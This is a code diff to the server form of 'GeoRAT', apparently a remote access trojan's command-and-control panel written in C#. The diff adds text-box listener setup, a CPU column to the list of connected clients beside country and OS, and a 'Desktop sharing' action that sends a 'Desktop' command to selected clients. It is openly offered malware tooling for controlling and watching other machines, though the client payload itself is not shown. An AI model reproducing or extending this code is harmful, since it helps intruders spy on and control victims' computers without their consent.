@@ -1,11 +1,14 @@
 ﻿
 using System;
+using System.Drawing;
+using System.IO;
 using System.Net.Sockets;
 using System.Windows.Forms;
 using GeoRAT.Server.CommandHandlers;
 using GeoRAT.Server.Net;
 using GeoRAT.Server.PacketStruct;
 using Microsoft.VisualBasic;
+
 
 namespace GeoRAT.Server
 {
@@ -16,15 +19,24 @@ namespace GeoRAT.Server
         public Form1()
         {
             InitializeComponent();
+            
         }
 
-        private void startToolStripMenuItem_Click(object sender, System.EventArgs e)
+        private void xylosButton1_Click(object sender, EventArgs e)
         {
-            var IP = Interaction.InputBox("Enter IP", "Listener", "");
-            var PORT = int.Parse(Interaction.InputBox("Enter port", "Listener", "100"));
-            NetworkServer ns = new NetworkServer(IP, PORT);
-            ns.OnConnected += OnConnectedHandler;
-            ns.Start();
+            try
+            {
+
+                var IP = xylosTextBox1.Text;
+                var PORT = int.Parse(xylosTextBox2.Text);
+                NetworkServer ns = new NetworkServer(IP, PORT);
+                ns.OnConnected += OnConnectedHandler;
+                ns.Start();
+            }
+            catch 
+            {
+                MessageBox.Show("Enter valid IP address and port!", "Something went wrong", MessageBoxButtons.OK, MessageBoxIcon.Error); 
+            }
         }
 
         //Handle new connection 
@@ -67,6 +79,7 @@ namespace GeoRAT.Server
                     item.ImageIndex = index;
                     item.SubItems.Add(data.Country);
                     item.SubItems.Add(data.OS);
+                    item.SubItems.Add(data.CPU);
                     lvConnections.Items.Add(item);
                     ClientsConnected++;
                     UpdateOnline();
@@ -76,7 +89,6 @@ namespace GeoRAT.Server
 
         private void UpdateOnline()
         {
-            label1.Text = "Clients connected:" + "" + "" + ClientsConnected;
         }
         //if client disconnects, remove it from listview 
 
@@ -144,5 +156,16 @@ namespace GeoRAT.Server
                 Sender = new CommandSender((Socket)i.Tag, new Commands("Message", msg));
             }
         }
+
+        private void desktopSharingToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem i in lvConnections.SelectedItems)
+            {
+                Sender = new CommandSender((Socket) i.Tag, new Commands("Desktop", ""));
+                
+            }
+        }
+
+       
     }
 }
